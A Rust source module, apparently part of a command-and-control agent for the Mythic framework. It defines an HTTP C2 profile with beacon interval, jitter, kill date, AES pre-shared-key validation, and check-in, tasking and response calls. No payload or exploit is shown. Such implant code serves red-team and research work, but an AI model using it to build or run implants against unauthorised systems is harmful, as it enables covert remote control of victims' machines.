use crate::Result;
use crate::config::ConfigError;
use base64::Engine;
use mythic::C2Transport;
use serde::{Deserialize, Serialize};

pub mod http;

/// AES-256 needs a 32-byte key. Mythic serialises that as a base64 string;
/// we accept either the raw 32-byte form (no padding) or the 44-byte
/// standard base64 form. We surface a clean `ConfigError::InvalidPsk`
/// rather than letting the AES layer fail with a confusing "cipher"
/// error deep in the stack.
const AES_KEY_LEN: usize = 32;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum C2Profile {
    #[serde(rename = "http")]
    Http(http::HttpProfile),
}

impl C2Profile {
    pub fn callback_interval(&self) -> u64 {
        match self {
            C2Profile::Http(p) => p.callback_interval,
        }
    }

    pub fn callback_jitter(&self) -> u64 {
        match self {
            C2Profile::Http(p) => p.callback_jitter,
        }
    }

    /// Killdate string (YYYY-MM-DD), or None if not set.
    pub fn killdate(&self) -> Option<String> {
        match self {
            C2Profile::Http(p) => {
                if p.killdate.is_empty() {
                    None
                } else {
                    Some(p.killdate.clone())
                }
            }
        }
    }

    /// Whether this profile wants an external IP lookup at check-in.
    pub fn external_ip_check(&self) -> bool {
        match self {
            C2Profile::Http(p) => p.external_ip_check(),
        }
    }

    /// Verify the AES PSK, if present, is a parseable base64 string that
    /// decodes to a 32-byte key. `None` is treated as "use Mythic's
    /// profile default" and skipped.
    pub fn validate_psk(&self) -> core::result::Result<(), ConfigError> {
        let psk = match self {
            C2Profile::Http(p) => p.aes_psk.as_ref(),
        };
        let Some(psk) = psk else { return Ok(()) };

        if psk.is_empty() {
            return Err(ConfigError::InvalidPsk {
                reason: "aes_psk is empty".into(),
            });
        }
        let decoded = base64::engine::general_purpose::STANDARD
            .decode(psk.trim())
            .map_err(|e| ConfigError::InvalidPsk {
                reason: format!("aes_psk is not valid base64: {e}"),
            })?;
        if decoded.len() != AES_KEY_LEN {
            return Err(ConfigError::InvalidPsk {
                reason: format!(
                    "aes_psk decodes to {} bytes, expected {AES_KEY_LEN}",
                    decoded.len()
                ),
            });
        }
        Ok(())
    }
}

impl C2Transport for C2Profile {
    fn get_aes_psk(&self) -> Option<String> {
        match self {
            C2Profile::Http(profile) => profile.get_aes_psk(),
        }
    }

    fn set_aes_psk(&mut self, key: &str) -> Option<String> {
        match self {
            C2Profile::Http(profile) => profile.set_aes_psk(key),
        }
    }

    fn random_iv(&self) -> Result<[u8; 16]> {
        match self {
            C2Profile::Http(profile) => profile.random_iv(),
        }
    }

    fn encrypted_exchange_check(&self) -> bool {
        match self {
            C2Profile::Http(profile) => profile.encrypted_exchange_check(),
        }
    }

    fn checkin(&self, packed: &str) -> Result<String> {
        match self {
            C2Profile::Http(profile) => profile.checkin(packed),
        }
    }
    fn get_tasking(&self, packed: &str) -> Result<String> {
        match self {
            C2Profile::Http(profile) => profile.get_tasking(packed),
        }
    }
    fn post_response(&self, packed: &str) -> Result<String> {
        match self {
            C2Profile::Http(profile) => profile.post_response(packed),
        }
    }
}
